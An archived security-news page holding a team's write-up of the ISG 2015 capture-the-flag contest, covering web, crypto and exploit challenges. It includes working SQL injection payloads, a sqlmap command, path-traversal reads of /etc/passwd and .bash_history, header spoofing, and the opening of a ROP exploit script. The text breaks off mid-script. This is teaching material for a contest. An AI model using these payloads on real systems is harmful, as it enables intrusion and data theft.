<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>ISG2015 FlappyPig Writeup - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="ISG2015,FlappyPig,Writeup"/>
    
        <meta name="description" content="ISG2015 FlappyPig Writeup"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>ISG2015 FlappyPig Writeup</h2>
                <div class="article-msg">
                    <span class="time">2015-10-20 13:49:33</span>
                                        <span class="read">阅读：43818次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_702"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="702" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href=""
                             target="_blank">来源： 360安全播报</a></span>
                    
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><h2 style="text-align: center;"><img alt="http://p6.qhimg.com/t01815e3bc41c5c86c8.jpg" src="http://p6.qhimg.com/t01815e3bc41c5c86c8.jpg" title="t01815e3bc41c5c86c8.jpg"/><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑,Microsoft YaHei;"></span></strong></span></h2><h2 style="text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑,Microsoft YaHei;">Misc</span></strong></span></h2><h3 style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">Welcome to ISG 2015 (50)</span></h3><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">直接在网页源码中找到,em标签替换为下划线即可。</span></p><h2 style="text-align: left;"><br/><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 18px;"></span></h2><h2 style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 18px;">Web</span></h2><h3 style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">collision (50)</span></h3><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">那串数字的开头是0e,那么我们只要找到同样0e开头的md5值即可。详见</span><a style="text-decoration: underline; color: windowtext; font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;" href="qq://txfile/"><span style="color: windowtext; font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">https://v2ex.com/t/188364</span></a><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">。由于php的特性,这两个进行比较的时候会变成0。</span></p><h3 style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">array (150)</span></h3><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">在php版本<span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei; color: rgb(38, 38, 38);">5.4.0 - 5.4.43, 5.5.0 - 5.5.26, 5.6.0 - 5.6.10, 7.0.0alpha1中数组下标为0x100000000的时候</span> <span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei; color: rgb(38, 38, 38);">会和数组下标为0的时候相等</span></span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; color: rgb(38, 38, 38); font-size: 14px;">所以构造array.php?user[4294967296]=admin&amp;user[1]=1445132760</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; color: rgb(38, 38, 38); font-size: 14px;">后面的时间戳向后设置10秒左右,一直刷新就可以出flag了.</span></p><h2 style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">webdroid (200)</span></h2><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">把apk反编译之后可以看到一段代码:</span></p><pre class="brush:js;toolbar:false">new&nbsp;DefaultHttpClient();
HttpPost&nbsp;localHttpPost&nbsp;=&nbsp;new&nbsp;HttpPost(&quot;http://202.120.7.135:8888/html/api.php&quot;);
JSONObject&nbsp;localJSONObject&nbsp;=&nbsp;new&nbsp;JSONObject();
localJSONObject.put(&quot;secret&quot;,&nbsp;paramString);
localHttpPost.setEntity(new&nbsp;StringEntity(localJSONObject.toString()));
String&nbsp;str&nbsp;=&nbsp;EntityUtils.toString(new&nbsp;DefaultHttpClient().execute(localHttpPost).getEntity());
return&nbsp;str;</pre><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span><br/></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">大概意思是将JSON数据{&quot;secret&quot;:paramString}POST到那个链接</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">直接用burp发包修改Content-Type提交数据{&quot;secret&quot;:0}</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">解码失败后是null</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">服务端估计又是用的弱类型判断 null==0</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">拿到flag</span></p><h3 style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">Fruit Store (200)</span></h3><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">GBK注入 直接扔到sqlmap里就能跑</span></p><pre class="brush:cpp;toolbar:false">sqlmap&nbsp;-u&nbsp;&quot;
http://202.120.7.140:8888/try.php?fruit=flag%df*&quot;</pre><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span><br/></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">跑出来之后数据库是store表是tell_me_who_u_are --dump一下就出flag了</span></p><h3 style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">Image Database (200)</span></h3><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">提交../../../../../../../etc/passwd可以读到用户主目录是/home/isg</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">提交../../../../../../../home/isg/.bash_history可以知道/home/isg/web目录下有main.py</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">直接读读不了所以读main.pyc</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">反编译字节码之后在代码里看到flag在secret/flag.txt也是不能直接读</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">看代码之后发现有get_image get_text secret_protect三个主要函数</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">get_image会将用户提交的数据base64加密后传给secret_protect</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">get_text会将用户提交的数据直接传给secret_protect</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">所以通过get_text可以直接绕过secret_protect的限制</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">get_text绑定的路由是/gettext_underbuilding</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">所以POST提交的时候用burp拦截下来把/getimg改成/gettext_underbuilding就可以获取flag了</span></p><h3 style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">shell (250)</span></h3><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">能上传文件,文件名是 用户名.随机序列所以考虑注册一个.php结尾的用户</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">直接注册不了带非数字和非字母的用户名,检测之后发现邮箱的位置有注入所以想到在注册的时候直接额外添加一个.php结尾的用户</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">根据Web 350 Injection那道题的源码猜测本题的SQL插入语句也是</span></p><pre class="brush:cpp;toolbar:false">$sql&nbsp;=&nbsp;&quot;INSERT&nbsp;INTO&nbsp;users(username,&nbsp;password,&nbsp;email,&nbsp;ip)&nbsp;VALUES&nbsp;(&#39;$username&#39;,&nbsp;&#39;$password&#39;,&nbsp;&#39;$email&#39;,&nbsp;&#39;$ip&#39;)&quot;;</pre><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">这种形式</span><br/></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">所以构造payload:</span></p><pre class="brush:cpp;toolbar:false">username=asdasd5cacc&amp;password=asdasdaccc&amp;email=sasad@qq.com&#39;,&#39;127.0.0.1&#39;),(&#39;sbsun.php&#39;,&#39;f5de0b92fcff5f1fa67c503c04008278&#39;,&#39;6666@qq.com&#39;,&#39;127.0.0.1&#39;)&nbsp;%23</pre><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span><br/></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">形成</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">$sql = &quot;INSERT INTO users ( username , password , email , ip) VALUES ( &#39;asdasd5cacc&#39; , &#39;asdasdaccc&#39;,&#39;<span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei; color: red;">sasad@qq.com&#39;,&#39;127.0.0.1&#39;),(&#39;sbsun.php&#39;,&#39;f5de0b92fcff5f1fa67c503c04008278&#39;,&#39;6666@qq.com&#39;,&#39;127.0.0.1&#39;) #</span><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei; color: black;"> &#39;,&#39;$ip&#39;</span>)&quot;;</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">来同时插入两个用户</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">然后用新注册的用户登录后上传文件并访问即可拿到flag.</span></p><h3 style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">SuperAdmin (250)</span></h3><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">估计是注册的时候没有把用户名trim而登录时验证的是用户名trim后是否等于&quot;admin&quot; 所以注册的时候用户名注册为类似admin%20%0a这种,登录之后会被认为是admin登陆</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">登陆之后提示&quot;你不是本机用户,不能看到调试信息&quot;</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">登陆的时候把XFF头改成127.0.0.1就好了</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">看到一部分源码,源码具体内容没保存,忘了,就记得主要的是调用一个register函数,前几个参数是用户名,密码,IP,最后一个参数是$is_super</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">考虑可能存在变量覆盖漏洞</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">所以再注册一次用户并在url加上参数is_super=1然后注册登陆后即可看到flag</span></p><h3 style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">injection (350)</span></h3><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">根据index.php.bak审计源码,</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">发现可能存在二次注入</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">search的时候用户名是从session中读取的,</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">session中的用户信息是在登陆或注册的时候存进去的,</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">fuzz了一下,发现可能存在内容截断,用户名在数据库中设置的长度是64</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">提交注册数据</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">username=lingaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaacd\&amp;password=asd&amp;email=asd%40qq.com</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">带入到$sql之后可以造成单引号逃逸,使得$title可以直接注入</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">$sql = &quot;select * from posts where username=&#39;lingaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaacd\&#39; and title like &#39;$title&#39;&quot;;</span></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">登陆后可以直接用search=xxx进行手注也可以带着登陆后的cookie扔到sqlmap里跑,然后就能出flag了</span></p><h2 style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 18px;">Crypto</span></h2><h3 style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">RSA (100)</span></h3><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">从使用openssl从pem文件中提取e,n,n为256bit,上rsatools直接破:</span></p><p style="text-align: left;"><br/></p><p style="text-align: center;"><img alt="http://p0.qhimg.com/t011dd848a3b367132e.png" src="http://p8.qhimg.com/t01a9777452d32ebcbb.png" title="t011dd848a3b367132e.png"/></p><p><br/></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">然后利用n求得d后直接解密enc文件即可:</span></p><pre class="brush:python;toolbar:false">__author__&nbsp;=&nbsp;&#39;bibi&#39;
n=0xA41006DEFD378B7395B4E2EB1EC9BF56A61CD9C3B5A0A73528521EEB2FB817A7
e=65537
p=0xD7DB8F68BCEC6D7684B37201385D298B
q=0xC292A272E8339B145D9DF674B9A875D5
d=0x330228A0BBE9C119B6B9FEB34B673E6D9AAC3AD81409694B576871521254A2C1
r=open(&quot;flag.enc&quot;,&quot;rb&quot;)
re=r.read()
print&nbsp;re.encode(&quot;hex&quot;)
m=0x49b96edbe3961f58d529074bd893d6e036ceaf2b6d214b470fdc0d48723d6a40
c=pow(m,d,n)
print&nbsp;c
print((&#39;0&#39;+hex(c)[2:][:-1]).decode(&quot;hex&quot;))</pre><p><br/></p><table cellpadding="0" cellspacing="0"><tbody><tr class="firstRow"></tr></tbody></table><h3 style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">Alice(200)</span></h3><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">通过交互得知Alice在和Bob使用共享密钥算法Diffie-Hellman,这个题目本身并没有难点,主要是能够成功和Alice交互密钥即可。首先Alice向Bob提供了素数p和原根g,然后Alice自己产生了自己的私钥,并计算出公钥即key发送给Bob。我们作为Bob的模拟方,首先自己随便取一个私钥,然后根据素数p和原根g计算出公钥,发送给Alice,并通过Alice的公钥和我们的私钥计算出共享密钥K。Alice之后发送过来的密文即可以用K异或解密了。和Alice进行脑洞的对话后获取flag。注意密钥的长度不够,在flag传过来的时候,密钥倍长了一次。</span></p><p style="text-align: center;"><img alt="http://p0.qhimg.com/t012fdf0747a0cba895.jpg" src="http://p0.qhimg.com/t0130f9c6ee9c350f85.jpg" title="t012fdf0747a0cba895.jpg"/></p><p><br/></p><table cellpadding="0" cellspacing="0"><tbody><tr class="firstRow"><td style="border: 1px solid windowtext; padding: 0px 7px; word-break: break-all;" valign="top" width="553"><pre class="brush:python;toolbar:false">__author__&nbsp;=&nbsp;&#39;bibi&#39;
&nbsp;from&nbsp;zio&nbsp;import&nbsp;*
&nbsp;import&nbsp;time
&nbsp;def&nbsp;convert_int(s):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rs=s[::-1]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r=0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;rs:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r=(r&lt;&lt;8)|(ord(i))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;r
&nbsp;def&nbsp;tentostr(k):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;temp=hex(k)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;t=str(temp)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;t[-1]==&#39;l&#39;&nbsp;or&nbsp;t[-1]==&#39;L&#39;:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;t=t[0:-1]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r=t[2:]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;l=len(r)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;l&nbsp;%&nbsp;2&nbsp;==&nbsp;1:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r=&#39;0&#39;+r
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;r.decode(&quot;hex&quot;)
&nbsp;def&nbsp;crypt(c,key):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;miyao=tentostr(key)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;miyao=miyao+miyao
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result=&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(len(c)):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result=result+chr(ord(c[i])^ord(miyao[i]))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;result
&nbsp;
&nbsp;io=zio((&quot;202.120.7.153&quot;,10002))
&nbsp;text=io.read_until(&quot;Bob:&nbsp;KEY&nbsp;=&quot;)
&nbsp;p=7434819441271677988772806904156413576519364203006754273683435665142647787269043488641
&nbsp;g=3
&nbsp;
&nbsp;agkey=int(text.split(&quot;KEY&nbsp;=&nbsp;&quot;)[1].split(&quot;\n&quot;)[0])
&nbsp;bskey=123
&nbsp;bgkey=pow(g,bskey,p)
&nbsp;io.write(str(bgkey))
&nbsp;
&nbsp;K=pow(agkey,bskey,p)
&nbsp;next=io.read_until(&quot;\nBob:&nbsp;&quot;)
&nbsp;text=next.split(&quot;Alice:&nbsp;&quot;)[1].split(&quot;\n&quot;)[0].decode(&quot;base64&quot;)
&nbsp;
&nbsp;#print&nbsp;&quot;################&quot;+crypt(text,K)
&nbsp;io.write(crypt(&quot;Alice&quot;,K).encode(&quot;base64&quot;))
&nbsp;text2=io.read_until(&quot;\n&quot;)
&nbsp;time.sleep(1)
&nbsp;m2=text2.split(&quot;e:&nbsp;&quot;)[1].split(&quot;\n&quot;)[0].decode(&quot;base64&quot;)
&nbsp;print&nbsp;crypt(m2,K)
&nbsp;io.interact()</pre><span style="color: black;"></span></td></tr></tbody></table><h2 style="text-align: left;"><br/><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span></h2><h2 style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 18px;">Exploit</span></h2><h3 style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">pwnme (100)</span></h3><p style="text-align: left;"><br/></p><p style="text-align: center;"><a name="OLE_LINK1"></a></p><p><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 逻辑非常简单:</span></p><p><br/></p><p style="text-align: left;"><br/></p><p style="text-align: center;"><img alt="http://p2.qhimg.com/t0178525cc288d412b4.png" src="http://p8.qhimg.com/t0161024d6c71489157.png" title="t0178525cc288d412b4.png"/><img alt="http://p1.qhimg.com/t01e7741e3b2291c9b5.png" src="http://p3.qhimg.com/t01c94b971ef296d5dd.png" title="t01e7741e3b2291c9b5.png"/></p><p><br/></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 覆盖返回地址后,构造rop即可拿到shell,代码如下:</span></p><p style="margin-left: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span></p><pre class="brush:python;toolbar:false">__author__&nbsp;=&nbsp;&quot;pxx&quot;
from&nbsp;zio&nbsp;import&nbsp;*
import&nbsp;struct
target&nbsp;=&nbsp;(&quot;202.120.7.145&quot;,&nbsp;9991)#&quot;./pwnme&quot;
def&nbsp;get_io(target):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io&nbsp;=&nbsp;zio(target,&nbsp;timeout&nbsp;=&nbsp;9999)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;io
def&nbsp;full_buff(cur_data,&nbsp;length,&nbsp;ch_t&nbsp;=&nbsp;&#39;a&#39;):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;len_t&nbsp;=&nbsp;length&nbsp;-&nbsp;len(cur_data)
